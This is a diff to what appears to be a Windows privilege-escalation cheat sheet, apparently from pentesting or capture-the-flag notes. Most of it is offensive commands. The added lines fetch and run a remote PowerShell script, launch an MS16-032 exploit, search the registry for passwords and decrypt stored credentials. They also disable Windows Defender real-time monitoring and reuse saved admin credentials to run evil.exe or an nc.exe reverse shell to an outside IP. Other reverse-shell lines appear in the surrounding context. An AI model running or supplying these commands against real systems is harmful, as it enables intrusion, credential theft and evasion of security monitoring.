@@ -21,12 +21,15 @@ C:\> net user student
 C:\> net user
 C:\> hostname
 C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" #OS info
+C:\> gwmi win32_operatingsystem | % caption
 
 C:\> tasklist /SVC #Running processes
 
 C:\> ipconfig /all #Network info
 C:\> route print   #Routing table
+
 C:\> netstat -ano  #Running Net services + PID
+c:\>tasklist | findstr 660 #660 PID from netstat
 
 C:\> netsh advfirewall show currentprofile 					#Firewall Profile
 C:\> netsh advfirewall firewall show rule name=all	#Firewall Rules
@@ -49,6 +52,39 @@ PS C:\> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, D riverV
 C:\> icacls "C:\Program Files\Serviio\bin\ServiioService.exe" #check for SIDs
 C:\> 
 C:\> 
+
+
+
+PS C:temp> iex(new-object net.webclient).downloadstring('http://10.10.14.5/Sherlock.ps1')
+PS C:temp> Find-AllVulns
+OR
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\exp2.ps1; Invoke-MS16-032}"
+
+
+#search for password in registry
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+
+
+
+Powershell read secret files
+$credential = Import-CliXml -Path C:\Data\Users\app\user.txt
+$credential.GetNetworkCredential().Password
+
+
+
+# check status of Defender
+PS C:\> Get-MpComputerStatus
+
+# disable Real Time Monitoring
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+
+# Default Writeable Folders
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\Tasks
+C:\windows\tracing
 ```
 
 **Automated Check**:
@@ -191,7 +227,7 @@ Technique also available in Metasploit : `exploit/windows/local/always_install_e
 
 Use the `cmdkey` to list the stored credentials on the machine.
 
-```
+```powershell
 cmdkey /list
 Currently stored credentials:
  Target: Domain:interactive=WORKGROUP\Administrator
@@ -201,13 +237,16 @@ Currently stored credentials:
 
 Then you can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.
 
-```
-runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+```powershell
+C:\> runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+
+C:\> runas /user:Administrator /savecred "nc.exe -e cmd.exe 10.10.16.125 4433"
+
 ```
 
 Using `runas` with a provided set of credential.
 
-```
+```powershell
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 $secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
@@ -297,7 +336,7 @@ _SC_RpcLocator
 
 ### Windows XP SP0/SP1 Privilege Escalation to System
 
-```
+```powershell
 sc qc upnphost
 sc qc SSDPSRV
 
@@ -308,6 +347,19 @@ net start upnphost
 
 On the new shell
 C:\Inetpub\wwwroot\nc.exe 192.168.119.122 4422 -e C:\WINDOWS\System32\cmd.exe
+
+```
+
+
+
+
+
+# Suspicious Privilages
+
+```
+SeBackupPrivilege
+SeLoadDriverPrivilege
+SeImpersonate
 
 ```
 
